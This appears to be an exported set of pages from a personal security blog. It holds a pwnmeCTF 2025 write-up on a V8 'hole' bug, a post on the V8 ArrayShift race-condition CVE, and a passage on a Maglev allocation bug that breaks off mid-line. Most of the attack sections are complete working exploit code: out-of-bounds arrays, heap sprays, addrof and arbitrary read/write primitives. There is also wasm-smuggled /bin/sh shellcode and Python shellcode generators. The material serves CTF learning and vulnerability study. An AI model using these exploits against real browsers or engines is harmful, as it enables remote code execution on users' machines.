
[{"content":"","date":"2025-03-03","externalUrl":null,"permalink":"/tags/hole/","section":"Tags","summary":"","title":"Hole","type":"tags"},{"content":"Introduction: # This is the writeup for the pwnmeCTF 2025 challenge called holy cow revenge². This one is going to be crisp and quick.\nThe lore: # This challenge is not about the cow itself but we are talking about the hole in javascript engine called v8. This challenge was a revenge of the already existing challenge called holy cow ofcourse.\nWhat happened ? The author forgot to remove the d8 builtins. So people sovled it within few minutes of the ctf starting. My stupid brain thought everyone had a nday/ zeroday in their hand to solve ctf challenges. :P\nThis is how holy cow revenge² was born.\nAlso I am still learning browser exploitation and this is my attempt to understand what exactly is going on in this vulnerability. I solved it only after the ctf because my tiny brain could\u0026rsquo;nt figure out how to mess up the range analysis in time. But enough ranting time to understand some v8.\nThe patch: # +BUILTIN(SetPrototypeHole) { + HandleScope scope(isolate); + return ReadOnlyRoots(isolate).hash_table_hole_value(); +} + This is as straight forward as it can get. This leaks the value of the hole itself. How is this dangerous ? Read this to get a better understanding.\n+ + // BUG: I saw some guis doing weird stuff with this ... + CSA_CHECK(this, SmiGreaterThanOrEqual(CAST(LoadObjectField(table, OrderedHashMap::NumberOfElementsOffset())), SmiConstant(0))); + This part of the patch checks if your number of elements for the map is greater than 0, during a element insertion (MapPrototypeSet). This is what prevents you from using the previous holy cow challenge. Since the old exploit keeps abusing the map. (poor map).\nPOC: # let hole = Set.prototype.hole(); let set = new Set(); var map = new Map(); map.set(1, 0x69); map.set(hole, 0x69); map.delete(hole); map.delete(hole); map.delete(1); If you read the other blog you would have a good idea that the map.size now will be equal to -1.\nExploitation: # I was stuck at this stage for the rest of the CTF, then moved on to solve compresse which was a pretty good mix of both heap \u0026amp; stack. But yes, the idea here is that map.size will always be greater than equal to 0. Well this is true for most of the cases expect here. where our map.size is -1.\nWe can use turbofan to optimize our code. This is mainly done to remove bounds checking on Arrays, which would lead to creation of OOB array. Lets see how to do this.\nRemoval of Bound Check: # const x = itof(0x1000000000050001n); let obj_list; function bob(){ let a = [0.1, 0.2, 0.3, 0.4]; let b = new Array(1.1, 2.2); let ret = a[-map.size * 0x8]; a[-map.size * 0x8] = x; if (ret === undefined) return false else { return b; } } let OOB; while(true){ OOB = bob(); if(OOB !== false){ break; } } What is happening here ? We are calling the function in a while loop to trigger turbfan optimization for the specific function. In the fuction bob. We are creating 2 arrays, one for creating a OOB Array and another to help overwrite the length field of the OOB Array. But what exactly is happening and how does this work?\nSimplified Lowering: # You can clearly see that the compiler has wrong ranges assigned for the map.size which is \u0026gt;= 0. But in reality we have our map.size as -1. This could cause problems because in the further optimizations we can see that the bound check has completely vanished.\nUpuntil TFinlining: # Bytecode Graph Builder: # Finale: # so we go on to exploit the OOB array that was created using the incorrent range analysis. To make things easier the author has disabled heap sandboxing, otherwise you would need a 0day/ nday to solve the challenge. If you have doubts regarding how we use wasm to create and smuggle shellcode read my other blogpost.\nFinal Exploit: # /////////////////////////////////////////////////////////////////////// /////////////////// Utility Functions /////////////////// /////////////////////////////////////////////////////////////////////// let hex = (val) =\u0026gt; \u0026#39;0x\u0026#39; + val.toString(16); // 8 byte array buffer const __buf = new ArrayBuffer(8); const __f64_buf = new Float64Array(__buf); const __u32_buf = new Uint32Array(__buf); // typeof(val) = float function ftoi(val) { __f64_buf[0] = val; return BigInt(__u32_buf[0]) + (BigInt(__u32_buf[1]) \u0026lt;\u0026lt; 32n); // Watch for little endianness } function print(x){ console.log(\u0026#34;[+] \u0026#34; + x); } // typeof(val) = BigInt function itof(val) { __u32_buf[0] = Number(val \u0026amp; 0xffffffffn); __u32_buf[1] = Number(val \u0026gt;\u0026gt; 32n); return __f64_buf[0]; } function sleep(ms) { return new Promise(resolve =\u0026gt; setTimeout(resolve, ms)); } function reverse(x) { var buf = new ArrayBuffer(0x20); var view1 = new BigInt64Array(buf); var view2 = new Uint8Array(buf); view1[0] = x; view2.reverse(); return view1[3]; } function assert(x) { console.assert(x); } function gc(){ for(let i=0;i\u0026lt;0x10;i++) new ArrayBuffer(0x100000); } //////////////////////////////////////////////////////////////////////// ///////////////////// Main Exploit ///////////////////// //////////////////////////////////////////////////////////////////////// // for future - shellcode smuggling var wasm_code = new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x05,0x01,0x60,0x00,0x01,0x7c,0x03,0x02,0x01,0x00,0x07,0x08,0x01,0x04,0x6d,0x61,0x69,0x6e,0x00,0x00,0x0a,0x53,0x01,0x51,0x00,0x44,0xbb,0x2f,0x73,0x68,0x00,0x90,0xeb,0x07,0x44,0x48,0xc1,0xe3,0x20,0x90,0x90,0xeb,0x07,0x44,0xba,0x2f,0x62,0x69,0x6e,0x90,0xeb,0x07,0x44,0x48,0x01,0xd3,0x53,0x31,0xc0,0xeb,0x07,0x44,0xb0,0x3b,0x48,0x89,0xe7,0x90,0xeb,0x07,0x44,0x31,0xd2,0x48,0x31,0xf6,0x90,0xeb,0x07,0x44,0x0f,0x05,0x90,0x90,0x90,0x90,0xeb,0x07,0x44,0x0f,0x05,0x90,0x90,0x90,0x90,0xeb,0x07,0x1a,0x1a,0x1a,0x1a,0x1a,0x1a,0x1a,0x0b]); var wasm_mod = new WebAssembly.Module(wasm_code); var wasm_instance = new WebAssembly.Instance(wasm_mod); var f1 = wasm_instance.exports.main; // to corrupt the pointer here. var wasm_code_helper = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]); var wasm_mod_helper = new WebAssembly.Module(wasm_code_helper); var wasm_instance_helper = new WebAssembly.Instance(wasm_mod_helper); var f2 = wasm_instance_helper.exports.main; // Actual Exploit Starting function exp(){ let hole = Set.prototype.hole(); let set = new Set(); var map = new Map(); map.set(1, 0x69); map.set(hole, 0x69); map.delete(hole); map.delete(hole); map.delete(1); const x = itof(0x1000000000050001n); let obj_list; function bob(){ let a = [0.1, 0.2, 0.3, 0.4]; let b = new Array(1.1, 2.2); let ret = a[-map.size * 0x8]; a[-map.size * 0x8] = x; if (ret === undefined) return false else { return b; } } let OOB; while(true){ OOB = bob(); if(OOB !== false){ break; } } gc(); if(OOB.length == 2){ print(\u0026#34;OOB Array Creation - Failed.\u0026#34;) } print(\u0026#34;Gained OOB Array. Array Length: \u0026#34; + hex(OOB.length)); // The stack is misaligned here. pain! let rwx = ftoi(OOB[0x3645e]) \u0026gt;\u0026gt; 32n; rwx += (ftoi(OOB[0x3645f]) % 0x100000000n) \u0026lt;\u0026lt; 32n; print(\u0026#34;RWX Address: \u0026#34; + hex(rwx)); // trigger the first wasm function. f1(); let func_rwx_offset = rwx + 0x81an; OOB[0x36478] = itof(func_rwx_offset); f2(); } exp(); ","date":"2025-03-03","externalUrl":null,"permalink":"/writeups/1740990144225-holy-cow---pwnme25/","section":"Writeups","summary":"\u003ch3 class=\"relative group\"\u003eIntroduction: \n    \u003cdiv id=\"introduction\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#introduction\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h3\u003e\n\u003cp\u003eThis is the writeup for the pwnmeCTF 2025 challenge called \u003ccode\u003eholy cow revenge²\u003c/code\u003e. This one is going to be crisp and quick.\u003c/p\u003e","title":"holy cow - pwnme25","type":"writeups"},{"content":"","date":"2025-03-03","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"2025-03-03","externalUrl":null,"permalink":"/","section":"tourpran","summary":"","title":"tourpran","type":"page"},{"content":"","date":"2025-03-03","externalUrl":null,"permalink":"/tags/v8/","section":"Tags","summary":"","title":"V8","type":"tags"},{"content":" Various writeups from different CTFs I play, This mainly contains pwn challenges. For more challenges you can skim through my ctfs archive or go through some structured content stack, heap, browser.\n","date":"2025-03-03","externalUrl":null,"permalink":"/writeups/","section":"Writeups","summary":"","title":"Writeups","type":"writeups"},{"content":"","date":"2024-06-09","externalUrl":null,"permalink":"/tags/arrayshift/","section":"Tags","summary":"","title":"Arrayshift","type":"tags"},{"content":" Try solving these challenge on your own, and use this guide only when needed. If you want more challenges you can search in (pwn-hub) basic attacks\n","date":"2024-06-09","externalUrl":null,"permalink":"/posts/","section":"Blog Posts","summary":"","title":"Blog Posts","type":"posts"},{"content":"","date":"2024-06-09","externalUrl":null,"permalink":"/tags/browser/","section":"Tags","summary":"","title":"Browser","type":"tags"},{"content":"","date":"2024-06-09","externalUrl":null,"permalink":"/tags/turbofan/","section":"Tags","summary":"","title":"Turbofan","type":"tags"},{"content":"In this post, we’ll explore how to exploit a race condition in the V8 JavaScript engine, between the turbofan thread and the main thread that executes ArrayShift builtin function.\nTL;DR: Two different references to the same object is made from the turbofan thread and the main thread, thereby giving us UAF in the heap.\nPS: This is my attempt to understand the ArrayShift CVE with the help of this blogpost.\nAnalysis # Builtins: ArrayShift # The ArrayShift method removes the first element from an array and shifts the entire array to the left by one index. This process frees the elements\u0026rsquo; pointer and reallocates it, potentially leading to memory corruption if not handled properly.\nCreating Constant # ReduceElementLoadFromHeapConstant() - inlining phase When a value is frequently accessed, V8 optimizes it by treating it as a constant until the underlying array (Copy-On-Write or COW) changes. This optimization creates a reference to the element that can become problematic during concurrent operations.\nThe Bug # The core issue arises when the Turbofan thread executes ReduceElementLoadFromHeapConstant, creating a reference to an array\u0026rsquo;s element. Meanwhile, the main thread executes the ArrayShift prototype, which causes the reference to point, to a freed memory region in the heap.\nRace Condition # // src/compiler/js-heap-broker.cc return FixedArrayBaseRef( broker(), broker()-\u0026gt;CanonicalPersistentHandle(object()-\u0026gt;elements())); This line retrieves a pointer to the elements of the fixed array. Note that handles are tracked by V8\u0026rsquo;s garbage collector (GC).\nAfter executing the ArrayShift, a filler object replaces the first element:\n// src/heap/heap.cc CreateFillerObjectAt(old_start, bytes_to_trim, MayContainRecordedSlots(object) ? ClearRecordedSlots::kYes : ClearRecordedSlots::kNo); Memory State Example # Here’s a glimpse of the memory layout after each shift operation:\nelements: 0x12fa08295ee1 \u0026lt;FixedArray[145]\u0026gt; elements: 0x12fa08295ee5 \u0026lt;FixedArray[144]\u0026gt; elements: 0x12fa08295ee9 \u0026lt;FixedArray[143]\u0026gt; Proof of Concept (PoC) # This is the POC given by exodus intelligence, in their blog (mentioned below). In the below code the variable a has reference to the filter created by the arrayshift. Meanwhile in Garbage Collection cycle, filters are more or less treated as free space. Hence you have reference (Dangling pointer) to freed space.\nfunction exploit() { let bugSize = 120; let pushObj = [6969]; let barr = [1.1]; for (let i = 0; i \u0026lt; bugSize; i++) { barr.push(pushObj); } function danglingRef() { barr.shift(); // Shift the array for (let v19 = 0; v19 \u0026lt; 10000; v19++) {} // Busy wait let a = barr[0]; // Reference to freed element gc(); // Trigger garbage collection for (let v19 = 0; v19 \u0026lt; 500; v19++) {} // More busy wait } for (let i = 0; i \u0026lt; 4; i++) { danglingRef(); } } exploit(); barr is the array we will perform the bug on, in which 6969 is the marker which can be used in later stages while heap sprays are performed. We do a barr.shift() to trigger the shift prototype and in parallel the inlining phase is being run, which is supposed to make the barr[0] a constant reference. why optimize? In javascript the type is dynamic, So to skip the map verification steps, directly placing a reference to the first element will make things faster. I\u0026rsquo;m still unsure how they arrived at the number 4. When I asked one of the exploiters who developed this, they mentioned it was determined through dynamic testing and multiple runs. I don\u0026rsquo;t have a clear explanation for it just yet. Main Exploit Logic # We can try to understand my exploit part-by-part. Initially, we have all the standard exploitation utilities to trigger the GC cycle, convert float to int and vice-versa.\n/////////////////////////////////////////////////////////////////////// /////////////////// Utility Functions /////////////////// /////////////////////////////////////////////////////////////////////// let hex = (val) =\u0026gt; \u0026#39;0x\u0026#39; + val.toString(16); function gc() { for (let i = 0; i \u0026lt; 0x10; i++) new ArrayBuffer(0x1000000); } function print(msg) { // %DebugPrint(msg); console.log(\u0026#34;[+] \u0026#34; + msg); } function js_heap_defragment() { // used for stable fake JSValue crafting gc(); for (let i = 0; i \u0026lt; 0x1000; i++) new ArrayBuffer(0x10); for (let i = 0; i \u0026lt; 0x1000; i++) new Uint32Array(1); } // 8 byte array buffer const __buf = new ArrayBuffer(8); const __f64_buf = new Float64Array(__buf); const __u32_buf = new Uint32Array(__buf); // typeof(val) = float function ftoi(val) { __f64_buf[0] = val; return BigInt(__u32_buf[0]) + (BigInt(__u32_buf[1]) \u0026lt;\u0026lt; 32n); // Watch for little endianness } // typeof(val) = BigInt function itof(val) { __u32_buf[0] = Number(val \u0026amp; 0xffffffffn); __u32_buf[1] = Number(val \u0026gt;\u0026gt; 32n); return __f64_buf[0]; } function sleep(ms) { return new Promise(resolve =\u0026gt; setTimeout(resolve, ms)); } function reverse(x) { var buf = new ArrayBuffer(0x20); var view1 = new BigInt64Array(buf); var view2 = new Uint8Array(buf); view1[0] = x; view2.reverse(); return view1[3]; } function assert(x) { console.assert(x); } Now I created a wasm instance that has our smuggled shellcode, Which I have explained below. This is used in the later stages of exploit to get Code Execution.\n//////////////////////////////////////////////////////////////////////// ///////////////////// Main Exploit ///////////////////// //////////////////////////////////////////////////////////////////////// var wasm_code = new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x05,0x01,0x60,0x00,0x01,0x7c,0x03,0x02,0x01,0x00,0x07,0x08,0x01,0x04,0x6d,0x61,0x69,0x6e,0x00,0x00,0x0a,0x53,0x01,0x51,0x00,0x44,0xbb,0x2f,0x73,0x68,0x00,0x90,0xeb,0x07,0x44,0x48,0xc1,0xe3,0x20,0x90,0x90,0xeb,0x07,0x44,0xba,0x2f,0x62,0x69,0x6e,0x90,0xeb,0x07,0x44,0x48,0x01,0xd3,0x53,0x31,0xc0,0xeb,0x07,0x44,0xb0,0x3b,0x48,0x89,0xe7,0x90,0xeb,0x07,0x44,0x31,0xd2,0x48,0x31,0xf6,0x90,0xeb,0x07,0x44,0x0f,0x05,0x90,0x90,0x90,0x90,0xeb,0x07,0x44,0x0f,0x05,0x90,0x90,0x90,0x90,0xeb,0x07,0x1a,0x1a,0x1a,0x1a,0x1a,0x1a,0x1a,0x0b]); var wasm_mod = new WebAssembly.Module(wasm_code); var wasm_instance = new WebAssembly.Instance(wasm_mod); var f1 = wasm_instance.exports.main; Below exploit code is similar to the POC, which tries to get a dangling pointer in val.\nfunction exploit() { let push_obj = [420]; let arr = [1.1]; for(let i=0;i\u0026lt;120;i++){ arr.push(push_obj); } function bug(){ arr.shift() // move the array. for (let i = 0; i \u0026lt; 10000; i++) { console.i += 1; } // Trigger the compilation job let val = arr[0]; // reduce heap constant function gcing() { const v15 = new Uint8ClampedArray(120*0x400000); } gcing(); // Use After Free trigger - relocate the elements to old space for (let v19 = 0; v19 \u0026lt; 500; v19++) {} // not sure why ? (time issue ?) } // 4th time is when the race condition happens. for(let i=0;i\u0026lt;4;i++){ bug(); } Next, we start spraying the heap with multiple arrays to get to know where the dangling pointer is at. We know we have an overlap with the dangling pointer with the help of if(arr[0] != push_obj) check. We can further confirm that it is our arrays with size 0x50 and 0x60 consecutively. Then we search through all the arrays that has a new_len and we can confirm that it will be our Out Of bounds array. Since the actual length is much smaller than the manipulated length.\n// Spraying the arr elements pointer to get OOB array. let size_search = 0x50; let n_size_search = 0x60; let arr_search = []; let tmparr = new Array(Math.floor(size_search)).fill(9.9); let placeholder_obj = []; let tmpMarkerArray = new Array(n_size_search).fill({ a: placeholder_obj, b: placeholder_obj, notamarker: 0x12341234, floatprop: 9.9 }); let tmpfarr= [...tmparr]; let new_len = 0xffffff; for (let i = 0; i \u0026lt; 10000; i++) { arr_search.push([...tmpMarkerArray]); arr_search.push([...tmpfarr]); } if(arr[0] != push_obj){ for(let i=0;i\u0026lt;0x100;i++){ if(arr[i] == size_search \u0026amp;\u0026amp; arr[i+12] == n_size_search){ arr[i] = new_len; break; } } let OOB; for(let i=0;i\u0026lt;10000;i++){ if(arr_search[i].length == new_len){ OOB = arr_search[i]; print(\u0026#34;OOB array found in the spray\u0026#34;); break; } } Now that we have an OOB Array, We can get something much stabler to setup our ARB read and ARB write primitives. We try to find the location of the local_findme object with respect to the initial OOB array we have. We can get the offset i stored in marker for the same.\nlet objarr = []; for(let j=0;j\u0026lt;10000;j++){ let local_findme = { a: placeholder_obj, b: placeholder_obj, findme: 0x11111111, floatprop: 1.337, findyou:0x12341234 }; objarr.push(local_findme); function gcing(){ const r = new String(\u0026#34;Hello GC?\u0026#34;); } gcing(); } let marker = -1; let leak_obj; for(let i=size_search;i\u0026lt;new_len;i++){ ftoi(OOB[i]); // Why is this here ? No idea. if(hex(ftoi(OOB[i])).includes(\u0026#34;22222222\u0026#34;)){ let aux = new ArrayBuffer(8); let int_aux = new Uint32Array(aux); let float_aux = new Float64Array(aux); float_aux[0] = OOB[i]; if(int_aux[0].toString(16) == \u0026#34;22222222\u0026#34;){ int_aux[0] == 0x44444444; } else{ int_aux[1] = 0x44444444; } OOB[i] = float_aux[0]; for(let j=0; j\u0026lt;objarr.length; j++){ if(objarr[j].findme != 0x11111111){ leak_obj = objarr[j]; marker = i; print(\u0026#34;Found the leakable object. \u0026#34;); break; } } if(marker != -1){ break; } } } We create our standard addrof primitive. Which would put the object of which we need to leak the address. then from the OOB, we can get its address.\nprint(\u0026#34;Achieved addrof primitive.\u0026#34;) function addrof(obj){ leak_obj.a = obj; leak_obj.b = obj; let aux = new ArrayBuffer(8); let int_aux = new Uint32Array(aux); let float_aux = new Float64Array(aux); float_aux[0] = OOB[marker - 1]; if(int_aux[0] != int_aux[1]){ int_aux[0] = int_aux[1]; } let res = BigInt(int_aux[0]); return res; } We have this kind of a structure where we check if the int_aux[0] == 0x44444444 because sometimes the stack can be aligned differently because of the pointer compression. Hence in-order for us to know if its the higher/ lower 32 bits we use this special identifier.\nprint(\u0026#34;Achieved Arbitrary Read.\u0026#34;); function read64(addr){ let aux = new ArrayBuffer(8); let int_aux = new Uint32Array(aux); let float_aux = new Float64Array(aux); float_aux[0] = OOB[marker]; let save, ret; if(int_aux[0] == 0x44444444){ save = float_aux[0]; int_aux[1] = Number(addr-4n); OOB[marker] = float_aux[0]; } else{ float_aux[0] = OOB[marker+1]; save = float_aux[0]; int_aux[0] = Number(addr-4n); OOB[marker+1] = float_aux[0]; } ret = leak_obj.floatprop; OOB[(int_aux[0] == 0x44444444) ? marker : marker+1] = save; return ftoi(ret); } Similarly, We can use the same OOB array to do an 64 bit arbitrary write with the help of the fields in our special object we created before (local_findme).\nprint(\u0026#34;Achieved arbitrary write.\u0026#34;) function write64(addr, val){ let aux = new ArrayBuffer(8); let int_aux = new Uint32Array(aux); let float_aux = new Float64Array(aux); float_aux[0] = OOB[marker]; let save; if(int_aux[0] == 0x44444444){ save = float_aux[0]; int_aux[1] = Number(addr-4n); OOB[marker] = float_aux[0]; } else{ float_aux[0] = OOB[marker+1]; save = float_aux[0]; int_aux[0] = Number(addr-4n); OOB[marker+1] = float_aux[0]; } leak_obj.floatprop = itof(val); OOB[(int_aux[0] == 0x44444444) ? marker : marker+1] = save; if(read64(addr) != val){ print(\u0026#34;write failed.\u0026#34;); return 1; } } We find the address of the wasm_instance, from which a specific offset contains RWX region address, where we have our smuggled shellcode. So we overwrite the main\u0026rsquo;s entry point to our smuggled shellcode.\nlet addr_wasm = addrof(wasm_instance); let addr_rwx = read64(addr_wasm + 0x68n); print(\u0026#34;RWX: \u0026#34; + hex(addr_rwx)); // 64 bit address and 64 bit write. let bof = new ArrayBuffer(8); let int_bof = new Uint32Array(bof); let float_bof = new Float64Array(bof); let addr_int_bof = addrof(int_bof); write64(addr_int_bof+0x28n, addr_rwx); int_bof[0] = 0x047be9; print(hex(read64(addr_int_bof+0x28n))); // print(hex(read64(addr_rwx-411n))); int_bof; f1(); } else{ print(\u0026#34;Double reference failed. Race condition not achieved. \u0026#34;) } } exploit(); How to Smuggle shellcode? # For example, Lets say we have the following WAT file which we used as our wasm instance, the floating values in the IEEE format convert to a 8 byte value. In memory, they are something like mov reg, value, more ins, So we can abuse this to put 6 byte shellcode along with the relative jump to the next instruction.\n(module (func (export \u0026#34;main\u0026#34;) (result f64) f64.const 1.630394162327604e-270 f64.const 1.630523884017562e-270 f64.const 1.6304934513099134e-270 f64.const 1.6415294311136155e-270 f64.const 1.6306027780368592e-270 f64.const 1.6306160067349917e-270 f64.const 1.6305242777505848e-270 f64.const 1.6305242777505848e-270 drop drop drop drop drop drop drop )) So I have a Sample program to do the same.\nfrom pwn import * from ctypes import * instructions = [ \u0026#34;mov ebx, 0x0068732f\u0026#34;, \u0026#34;shl rbx, 32\u0026#34;, \u0026#34;mov edx, 0x6e69622f\u0026#34;, \u0026#34;add rbx, rdx\u0026#34;, \u0026#34;push rbx\u0026#34;, \u0026#34;xor eax, eax\u0026#34;, \u0026#34;mov al, 0x3b\u0026#34;, \u0026#34;mov rdi, rsp\u0026#34;, \u0026#34;xor edx, edx\u0026#34;, \u0026#34;xor rsi, rsi\u0026#34;, \u0026#34;syscall\u0026#34;, \u0026#34;nop\u0026#34;, \u0026#34;nop\u0026#34; ] context.arch = \u0026#34;amd64\u0026#34; tmp = b\u0026#34;\u0026#34; for ins in instructions: if(len(asm(ins) + tmp) \u0026gt; 6): print(hex(u64((tmp.ljust(6, b\u0026#34;\\x90\u0026#34;) + asm(\u0026#34;jmp $+9\u0026#34;))))) tmp = asm(ins) else: tmp += asm(ins) print(hex(u64((tmp.ljust(6, b\u0026#34;\\x90\u0026#34;) + asm(\u0026#34;jmp $+9\u0026#34;))))) \u0026#39;\u0026#39;\u0026#39; 0x7eb900068732fbb 1.630394162327604e-270 0x7eb909020e3c148 1.630523884017562e-270 0x7eb906e69622fba 1.6304934513099134e-270 0x7ebc03153d30148 1.6415294311136155e-270 0x7eb90e789483bb0 1.6306027780368592e-270 0x7eb90f63148d231 1.6306160067349917e-270 0x7eb90909090050f 1.6305242777505848e-270 \u0026#39;\u0026#39;\u0026#39; If you spend more time on this, you can make a better shellcode generator. For example, for a hypervisor challenge, I smuggled this particular type shellcode into the JIT-ted area.\nfrom pwn import * context.arch = \u0026#34;amd64\u0026#34; sh = \u0026#34;\u0026#34;\u0026#34;mov eax, 2 pushw 0x0067 pushw 0x616c pushw 0x662f xchg rdi, rsp xor esi, esi xor edx, edx syscall mov esi, eax mov edi, 1 mov al, 40 mov eax, 0x100 mov r10, eax syscall \u0026#34;\u0026#34;\u0026#34;.split(\u0026#34;\\n\u0026#34;) cnt = 0 reg = [\u0026#34;rdi\u0026#34;, \u0026#34;rsi\u0026#34;, \u0026#34;rdx\u0026#34;, \u0026#34;r15\u0026#34;, \u0026#34;r14\u0026#34;, \u0026#34;r13\u0026#34;, \u0026#34;r12\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;r10\u0026#34;, \u0026#34;r9\u0026#34;, \u0026#34;r8\u0026#34;,\u0026#34;rdi\u0026#34;] tmp = b\u0026#34;\u0026#34; final = \u0026#34;\u0026#34; for ins in sh: print(ins) if(len(tmp + asm(ins)) \u0026gt;= 6): final += f\u0026#34;\\\u0026#34;mov {reg[cnt]}, 0x{asm(\u0026#34;jmp $+8\u0026#34;)[::-1].hex() + \u0026#34;90\u0026#34;*(6-len(tmp)) + tmp[::-1].hex()};\\\u0026#34;\\n\u0026#34; tmp = asm(ins) cnt += 1 else: tmp += asm(ins) final += f\u0026#34;\\\u0026#34;mov {reg[cnt]}, 0x{asm(\u0026#34;jmp $+8\u0026#34;)[::-1].hex() + \u0026#34;90\u0026#34;*(6-len(tmp)) + tmp[::-1].hex()};\\\u0026#34;\\n\u0026#34; print(final) If you want the files to try it our on your own: repo containing files\nRoadblocks # While working on this exploit, I encountered several challenges:\nSeparation of Main and Elements Blocks: The main object block is significantly distanced from the elements block, complicating pointer manipulation. Finding Arbitrary Read: I initially struggled to find an effective way to achieve arbitrary read access, unaware that an inline HeapNumber would serve as a pointer to an IEEE format. Typed Arrays: Despite being challenging, I realized that typed arrays retain their backing store, allowing for straightforward 64-bit writes. Skill Development: This project was a steep learning curve, highlighting the complexities involved in exploitation. References # Exodus Intelligence Blog on V8 ArrayShift Race Condition ","date":"2024-06-09","externalUrl":null,"permalink":"/posts/1728447510508-v8---arrayshift-race-condition./","section":"Blog Posts","summary":"\u003cp\u003eIn this post, we’ll explore how to exploit a \u003ccode\u003erace condition\u003c/code\u003e in the \u003ccode\u003eV8\u003c/code\u003e JavaScript engine, between the \u003ccode\u003eturbofan thread\u003c/code\u003e and the \u003ccode\u003emain thread\u003c/code\u003e that executes \u003ccode\u003eArrayShift\u003c/code\u003e builtin function.\u003c/p\u003e","title":"v8 - ArrayShift Race Condition","type":"posts"},{"content":"This post explores a vulnerability found in the Maglev optimizing compiler of V8, specifically within a function responsible for optimizing classes that inherit from a parent class.\nThe Bug # The bug is located in the VisitFindNonDefaultConstructorOrConstructMaglev function. This function attempts to optimize a class that has a parent class, but the manner in which it is lowered introduces a critical issue.\nGarbage Collection Trigger:\nExecuting [1000] = 8 triggers garbage collection (GC). During GC, if it occurs between two folded allocations, the first allocated chunk may be relocated, and the space of the second allocation is freed since no objects point to it at that moment. This leads to an out-of-bounds (OOB) access during subsequent folded allocations. Note: In the image, the chunks are moved from the young generation to old space. The labels \u0026ldquo;old\u0026rdquo; and \u0026ldquo;new\u0026rdquo; denote the previous and current allocations, respectively, and should not be confused.\nAllocation Process:\nThe BuildAllocateFastObject() function calls ExtendOrReallocateCurrentRawAllocation(). Preconditions for allocation: The object being constructed must be constant: if (!maybe_constant) return false; The parent constructor must be a function: if (!current.IsJSFunction()) return false; The validity of the new_target_function as a constructor is checked: if (new_target_function \u0026amp;\u0026amp; new_target_function-\u0026gt;IsJSFunction() \u0026amp;\u0026amp; HasValidInitialMap(new_target_function-\u0026gt;AsJSFunction(), current_function)) If these conditions are met, BuildAllocateFastObject is invoked for allocation in the young generation. Exploit # To exploit this vulnerability:\nObtain Addrof Primitive: Start by acquiring an addrof primitive, which allows you to read memory addresses. Shellcode Smuggling: You embed you shellcode into floating point numbers in the wasm code. Through which you can execute 2/3 byte instructions and jump to the next floating point number. Problem with this Sandbox Escape: Once the WASM instance has been transitioned to trusted space, a new method is required to escape the sandbox and regain control over code execution. Patch # To address this vulnerability, the developers implemented the following changes:\nInvoke ClearCurrentRawAllocation: This function sets current_raw_allocation to null, ensuring that both allocations occur without the risk of being folded across a garbage collection (GC) run. This change prevents the out-of-bounds access that was causing the vulnerability.\nSecuring WASM Instances: The WASM instance has been moved into a trusted zone. Developers are actively working to eliminate any unsafe pointers associated with this instance, enhancing the security of the overall system.\npoc: # // Direct from the Exodus Blog (mentioned below). function main() { class ClassParent {} class ClassBug extends ClassParent { constructor() { const v24 = new new.target(); // makes the checkvalue of the parent class to be constant with this call. super(); // Creates the instance of `this` object and allocates the memory required for storing infor for this object. let a = [9.9,9.9,9.9,1.1,1.1,1.1,1.1,1.1]; // After triggering the GC in the wrong folded allocation this gets allocated, which gives us OOB } [1000] = 8; // trigger the GC } // triggering the maglev optimizer. for (let i = 0; i \u0026lt; 300; i++) { Reflect.construct(ClassBug, [], ClassParent); } } %NeverOptimizeFunction(main); main(); My exploit: # Some Basic utilities to make my exploitation phase easier: (includes float to int and vice-versa, trigger GC with the help of huge allcoations).\n/////////////////////////////////////////////////////////////////////// /////////////////// Utility Functions /////////////////// /////////////////////////////////////////////////////////////////////// let hex = (val) =\u0026gt; \u0026#39;0x\u0026#39; + val.toString(16); // 8 byte array buffer const __buf = new ArrayBuffer(8); const __f64_buf = new Float64Array(__buf); const __u32_buf = new Uint32Array(__buf); // typeof(val) = float function ftoi(val) { __f64_buf[0] = val; return BigInt(__u32_buf[0]) + (BigInt(__u32_buf[1]) \u0026lt;\u0026lt; 32n); // Watch for little endianness } function print(x){ console.log(\u0026#34;[+] \u0026#34; + x); } // typeof(val) = BigInt function itof(val) { __u32_buf[0] = Number(val \u0026amp; 0xffffffffn); __u32_buf[1] = Number(val \u0026gt;\u0026gt; 32n); return __f64_buf[0]; } function sleep(ms) { return new Promise(resolve =\u0026gt; setTimeout(resolve, ms)); } function reverse(x) { var buf = new ArrayBuffer(0x20); var view1 = new BigInt64Array(buf); var view2 = new Uint8Array(buf); view1[0] = x; view2.reverse(); return view1[3]; } function assert(x) { console.assert(x); } I have 2 wasm instances because, the first wasm_code has our smuggled shellcode, which I have covered in the ArrayShift Blogpost, The wasm_instance_helper is the object in which we will corrupt and redirect the RWX region to our shellcode.\n//////////////////////////////////////////////////////////////////////// ///////////////////// Main Exploit ///////////////////// //////////////////////////////////////////////////////////////////////// // for future - shellcode smuggling var wasm_code = new 